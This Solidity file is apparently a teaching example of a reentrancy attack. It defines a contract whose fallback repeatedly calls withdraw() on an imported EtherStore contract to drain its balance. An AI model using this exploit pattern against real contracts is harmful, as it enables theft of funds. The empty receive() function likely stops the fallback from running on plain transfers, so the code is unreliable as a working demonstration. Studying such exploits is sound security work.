pragma solidity >=0.8.3;
import "./EtherStore.sol";

contract Attack {
    EtherStore public etherStore;

    constructor(address _etherStoreAddress) {
        etherStore = EtherStore(_etherStoreAddress);
    }

    // Fallback is called when EtherStore sends Ether to this contract.
    fallback() external payable {
        if (address(etherStore).balance >= 1) {
            etherStore.withdraw();
        }
    }

    function attack() external payable {
        require(msg.value >= 1);
        etherStore.deposit{value: 1}();
        etherStore.withdraw();
    }

    // Helper function to check the balance of this contract
    function getBalance() public view returns (uint) {
        return address(this).balance;
    }

    receive() external payable {
        
    }

    
}